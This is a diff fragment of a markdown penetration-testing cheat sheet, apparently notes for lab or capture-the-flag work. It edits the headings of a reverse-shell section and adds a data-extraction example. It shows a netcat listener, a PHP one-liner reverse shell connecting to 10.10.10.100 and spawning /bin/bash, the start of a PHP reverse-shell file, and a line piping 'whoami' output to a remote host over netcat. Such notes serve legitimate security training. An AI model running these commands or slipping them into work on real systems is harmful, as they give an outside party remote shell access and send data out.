@@ -55,17 +55,17 @@ set payload <payload_name>
 exploit
 ```
 
-## PHP reverse shell
+## Reverse Shells
 ### Listener:
 ```bash
 nc -lvnp 4444
 ```
-### Reverse shell
-Command:
+### Bash
+### PHP (Command)
 ```bash
 php -r '$sock=fsockopen("10.10.10.100",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
-File:
+### PHP (File)
 ```php
 <?php
 $ip = '10.10.10.100'; // change this to your IP address
@@ -267,6 +267,11 @@ chmod +x linpeas.sh
 ```
 
 # Extraction
+## Send command output with `netcat`
+```bash
+whoami | nc 10.10.10.100 4444
+```
+
 ## Send directory with `netcat`
 ### Receiver:
 ```bash
